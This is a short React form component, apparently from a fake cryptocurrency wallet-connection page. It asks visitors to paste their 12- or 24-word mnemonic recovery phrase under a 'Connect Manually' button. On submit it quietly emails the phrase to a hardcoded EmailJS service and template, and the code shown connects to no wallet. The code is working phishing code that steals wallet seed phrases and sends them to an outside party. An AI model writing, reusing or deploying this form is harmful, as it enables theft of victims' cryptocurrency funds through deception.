import React, { useState, useRef } from "react";
import styles from "./FormTwo.module.css";
import emailjs from "@emailjs/browser";

const FormThree = () => {
  const [input, setInput] = useState("");
  const inputHandler = (e) => {
    setInput(e.target.value);
  };

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_t3pd0ok", "template_tgkmjj9", form.current, {
        publicKey: "r6jlFoRSbAij1f7VU",
      })
      .then(
        () => {
          console.log("SUCCESS!");
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );

    setInput("");
  };
  return (
    <form className="w-[100%]" ref={form} onSubmit={sendEmail}>
      <textarea
        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
        className="w-[100%] h-[100px] border-[1px] border-solid border-[#0000001A] rounded-md p-[0.3rem]"
        value={input}
        name="message"
        onChange={inputHandler}
      />
      <button
        className={`${styles.btn} ${
          !input ? styles.btnFaint : ""
        } cursor-pointer`}
        disabled={!input}
      >
        Connect Manually
      </button>
    </form>
  );
};

export default FormThree;
